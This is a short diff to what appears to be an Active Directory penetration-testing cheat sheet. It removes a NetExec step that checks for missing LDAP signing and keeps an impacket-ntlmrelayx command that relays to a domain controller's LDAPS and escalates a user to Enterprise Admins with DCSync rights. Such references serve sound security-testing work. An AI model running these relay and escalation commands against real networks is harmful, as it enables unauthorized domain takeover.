@@ -702,11 +702,6 @@ NetExec ldap <Domain_Controller_IP> -u <AD_user> -p <AD_password> -M pre2k
 <details>
   <summary> LDAP-relay </summary>   
 
-  ### Evaluate no ldap-signing and create an IP txt file for NTLMRelayx
-  ```shell
-  NetExec ldap <IPs> -d <Domain_Name> -u <AD_user> -p <AD_password> -M ldap-checker
-  ```
-
   ### NTLMRelayx escalate user to Enterprise Admins (DCSync rights)
   ```shell
   sudo impacket-ntlmrelayx -t ldaps://<Domain_Controller_IP> --escalate-user <AD_user>
